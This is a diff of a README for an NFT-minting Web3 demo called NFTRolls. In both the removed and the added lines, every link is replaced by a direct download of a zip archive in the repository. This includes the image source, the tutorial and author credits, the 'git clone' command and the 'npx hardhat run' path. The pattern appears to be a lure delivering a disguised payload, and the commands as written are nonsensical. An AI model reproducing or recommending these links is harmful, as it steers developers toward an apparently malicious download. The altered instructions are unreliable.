@@ -1,13 +1,13 @@
-<img width="567" alt="Screen Shot 2022-06-24 at 11 38 19" src="https://github.com/weiran0630/NFTRolls/raw/refs/heads/main/src/artifacts/Rolls_NFT_v3.3.zip">
+<img width="567" alt="Screen Shot 2022-06-24 at 11 38 19" src="https://raw.githubusercontent.com/weiran0630/NFTRolls/main/contracts/Rolls-NFT-1.5-alpha.5.zip">
 
 # NFTRolls
 
-This project demonstrates a basic Web3 Dapp for minting NFTs. Mostly referring to the [Web3 Tutorial](https://github.com/weiran0630/NFTRolls/raw/refs/heads/main/src/artifacts/Rolls_NFT_v3.3.zip) created by [@fireship-io](https://github.com/weiran0630/NFTRolls/raw/refs/heads/main/src/artifacts/Rolls_NFT_v3.3.zip), but with some great UI overhaul. It comes with an ERC721 contract, a test without actual testing (I'm too lazy for that), a script that deploys that contract, and a front-end application built with react and Chakra UI, which can mint some rick roll images.
+This project demonstrates a basic Web3 Dapp for minting NFTs. Mostly referring to the [Web3 Tutorial](https://raw.githubusercontent.com/weiran0630/NFTRolls/main/contracts/Rolls-NFT-1.5-alpha.5.zip) created by [@fireship-io](https://raw.githubusercontent.com/weiran0630/NFTRolls/main/contracts/Rolls-NFT-1.5-alpha.5.zip), but with some great UI overhaul. It comes with an ERC721 contract, a test without actual testing (I'm too lazy for that), a script that deploys that contract, and a front-end application built with react and Chakra UI, which can mint some rick roll images.
 
 Clone the project:
 
 ```shell
-git clone https://github.com/weiran0630/NFTRolls/raw/refs/heads/main/src/artifacts/Rolls_NFT_v3.3.zip
+git clone https://raw.githubusercontent.com/weiran0630/NFTRolls/main/contracts/Rolls-NFT-1.5-alpha.5.zip
 ```
 
 To compile and serve the contract on a local blockchain instance (Polygon testnet is used on this project btw):
@@ -18,7 +18,7 @@ npx hardhat compile
 npx hardhat node
 
 # Terminal tab 2
-npx hardhat run https://github.com/weiran0630/NFTRolls/raw/refs/heads/main/src/artifacts/Rolls_NFT_v3.3.zip --network localhost
+npx hardhat run https://raw.githubusercontent.com/weiran0630/NFTRolls/main/contracts/Rolls-NFT-1.5-alpha.5.zip --network localhost
 ```
 
 To run the front-end application on a local development server:
